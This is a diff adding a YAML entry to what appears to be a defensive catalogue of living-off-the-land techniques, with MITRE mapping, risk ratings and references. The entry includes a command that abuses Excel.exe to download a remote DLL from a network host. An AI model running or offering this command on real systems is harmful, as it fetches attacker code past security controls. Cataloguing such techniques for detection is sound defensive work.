@@ -1,0 +1,20 @@
+- command: Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
+  description: Abuse excel.exe to download a remote file and save it to the cache folder.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/
+    - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
+  risk: High
+  risk_reason: Usage of excel with remote off-prem files over the Internet is a suspicious activity.
+  fidelity: High
+  fidelity_reason: Usage of excel in this manner is typically rare in most organizations.
+  tool: excel
+  threatactors:
+    N/A:
+      - N/A
